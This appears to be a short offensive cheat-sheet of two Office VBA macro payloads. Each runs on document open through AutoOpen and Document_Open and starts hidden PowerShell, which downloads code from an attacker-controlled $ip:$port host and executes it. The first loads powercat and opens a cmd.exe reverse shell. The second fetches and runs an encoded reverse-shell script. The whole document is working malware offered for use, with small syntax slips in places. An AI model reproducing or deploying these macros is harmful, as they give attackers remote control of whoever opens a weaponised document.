## Normal Powercat

Sub AutoOpen()
  powercat
End Sub

Sub Document_Open()
  powercat
End Sub 

Sub powercat()
  Dim url as String
  Dim psScript as String
  url = http://$ip:$port/powercat.ps1
  psScript = "IEX (New-Object System.Net WebClient).DownloadString('" & url & "'); powercat -c $ip $port -e cmd.exe"

  Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -c """ & psScript & """", vsHide
End Sub



## Reverse Shell Payload Base64 powercat

Sub AutoOpen()
  powercat
End Sub

Sub Document_Open()
  powercat
End Sub 

Sub powercat()
  Dim str as String
  str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://$ip:$port/reverse_shell.txt'); iex 'powershell -WindowStyle Hidden -E $code'"""
  CreateObject("Wscript.Shell").Run str, 0
  
End Sub
